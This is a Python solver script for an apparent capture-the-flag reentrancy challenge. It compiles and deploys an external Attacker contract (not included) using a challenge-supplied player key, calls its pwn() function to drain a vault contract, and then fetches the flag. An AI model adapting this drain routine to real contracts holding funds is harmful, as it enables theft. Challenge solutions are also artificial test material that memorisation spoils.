#!/usr/bin/env python3
"""Automated solver for blockchain-reentrant-vault.

Reads the launcher info, compiles the Attacker, deploys it with the funded
player key (signing locally), drains the vault via reentrancy, then reads /flag.

Usage: solve.py http://HOST:PORT
"""
import json
import os
import sys
import urllib.request

import solcx
from eth_account import Account
from web3 import Web3

ATTACKER_SOL = os.path.join(os.path.dirname(__file__), "Attacker.sol")


def _get(base, path):
    return json.loads(urllib.request.urlopen(base + path, timeout=20).read().decode())


def _raw(signed):
    return getattr(signed, "raw_transaction", None) or signed.rawTransaction


def _send(w3, acct, tx):
    # build_transaction already sets chainId and EIP-1559 fee fields; only the
    # nonce needs filling. Do NOT add gasPrice (it conflicts with a type-2 tx).
    tx.setdefault("nonce", w3.eth.get_transaction_count(acct.address))
    signed = acct.sign_transaction(tx)
    h = w3.eth.send_raw_transaction(_raw(signed))
    return w3.eth.wait_for_transaction_receipt(h)


def main():
    if len(sys.argv) != 2:
        print("usage: solve.py http://HOST:PORT", file=sys.stderr)
        return 2
    base = sys.argv[1].rstrip("/")
    solcx.install_solc("0.8.20")
    solcx.set_solc_version("0.8.20")

    info = _get(base, "/info")
    vault = Web3.to_checksum_address(info["vault"])
    acct = Account.from_key(info["player_private_key"])
    w3 = Web3(Web3.HTTPProvider(base))  # JSON-RPC is proxied on the same URL
    print("[*] player", acct.address, "vault", vault, file=sys.stderr)

    with open(ATTACKER_SOL) as fh:
        out = solcx.compile_source(
            fh.read(), output_values=["abi", "bin"], solc_version="0.8.20"
        )
    key = next(k for k in out if k.endswith(":Attacker"))
    abi, bytecode = out[key]["abi"], out[key]["bin"]

    c = w3.eth.contract(abi=abi, bytecode=bytecode)
    rcpt = _send(
        w3,
        acct,
        c.constructor(vault).build_transaction(
            {"from": acct.address, "gas": 2_000_000}
        ),
    )
    attacker = w3.eth.contract(address=rcpt.contractAddress, abi=abi)
    print("[*] attacker deployed at", rcpt.contractAddress, file=sys.stderr)

    _send(
        w3,
        acct,
        attacker.functions.pwn().build_transaction(
            {"from": acct.address, "gas": 3_000_000, "value": w3.to_wei(1, "ether")}
        ),
    )
    print("[*] vault balance now", w3.eth.get_balance(vault), "wei", file=sys.stderr)

    res = _get(base, "/flag")
    if "flag" in res:
        print("[+] flag:", res["flag"])
        return 0
    print("[-] not solved:", res, file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
